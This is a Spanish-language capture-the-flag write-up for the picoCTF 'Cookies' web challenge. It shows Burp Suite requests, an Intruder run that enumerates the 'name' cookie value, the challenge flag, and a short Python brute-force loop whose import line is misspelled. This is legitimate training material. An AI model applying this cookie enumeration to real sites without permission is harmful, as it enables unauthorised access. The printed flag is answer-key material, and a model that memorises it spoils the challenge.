# Cookies

## Descripcion
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)
## Solucion
Probamos a escribir cosas aleatorias, pero realmente ninguna funcion, solo nos entrega este mensaje de error `That doesn't appear to be a valid cookie.`
Probamos a abrir burpsuite para ver que es lo que pasa al momento de escribir algo:
```
GET /check HTTP/1.1
Host: mercury.picoctf.net:29649
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mercury.picoctf.net:29649/
Accept-Encoding: gzip, deflate, br
Cookie: name=-1
Connection: keep-alive
```
Y podemos ver que cuando obtenemos la respuesta negativa, la cookie 'name' tiene el valor de -1, probamos a escribir el valor qu enos dice por defecto y la cookie cambia a 1. Entonces ahora con el intruder de burpsuite vamos y preparamos un ataque para ver en cual de las posibles cookies nos regresa algo de informacion valiosa.

```payload
-----------------------------------------------------------------
Payload type: Numbers
From:1
To:50
Seleccionar el valor de la cookie para que sea el que se cambie
-----------------------------------------------------------------

GET /check HTTP/1.1
Host: mercury.picoctf.net:29649
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mercury.picoctf.net:29649/
Accept-Encoding: gzip, deflate, br
Cookie: name=1
Connection: keep-alive
```
Y vemos que cuando la cookie tiene el valor de 18 es cuando nos da la flag:

```flag
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}
```

## Notas adicionales

```python
import request
import re

url = ""

for i in range(20):
	cookies = {'name':'{}'.format(i)}
	r = requests.get(url,cookies=cookies)
	if 'picoCTF' in r.text:
		flag=re.findall('picoCTF{.*}', r.text)[0]
		print(flag)
```

## Referencias
